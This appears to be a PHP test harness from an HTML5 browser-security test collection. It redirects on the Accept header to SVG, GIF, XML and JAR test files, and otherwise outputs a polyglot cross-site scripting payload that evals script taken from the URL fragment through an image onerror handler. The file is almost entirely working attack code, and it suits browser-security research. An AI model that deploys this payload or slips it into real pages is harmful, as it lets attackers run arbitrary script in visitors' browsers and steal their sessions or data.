<?php
header("Access-Control-Allow-Origin: *");
$urls = array(
    "image/*" => "//html5sec.org/test.svg",
    "image/svg" => "//html5sec.org/test.svg",
    "image/gif" => "//html5sec.org/test.gif",
    "application/xml" => "//htmlsec.org/test.xml",
    "application/zip" => "//html5sec.org/test.jar",
    "application/x-compressed" => "//html5sec.org/test.jar",
    "application/java-archivemime-type" =>  "//html5sec.org/test.jar",
    "application/atom+xml" => "//html5sec.org/rss",

);
function parse_accept($header) {
    $media_ranges = explode(",", $header);
    $sorted = array();
    foreach ($media_ranges as $mr) {
        $mr = array_reverse(explode(";", $mr)); // each media-request "type/subtype; q=xy" is now split and reversed
        if (count($mr) == 1) {
            $mr = array("q=1.0", $mr[0]); // none = highest priority
        }
        $mr[0] = floatval(str_replace("q=","", $mr[0])); // make float out of q=xx
        $sorted[] = $mr;
    }
    // with descending priority: array(array(prio, type), array(prio, type), ...)
    return $sorted;

}
if (isset($_SERVER['HTTP_ACCEPT'])) {
    $h = parse_accept($_SERVER['HTTP_ACCEPT']);
    foreach ($h as $entry) {
        $type = $entry[1];
        $prio = $entry[0];
        if (array_key_exists($type, $urls)) {
            header("Location: $urls[$type]");
            exit();
        }
        
    }
}
// if type not found or no accept header sent..
?>if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}//<img src="x:x" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}">
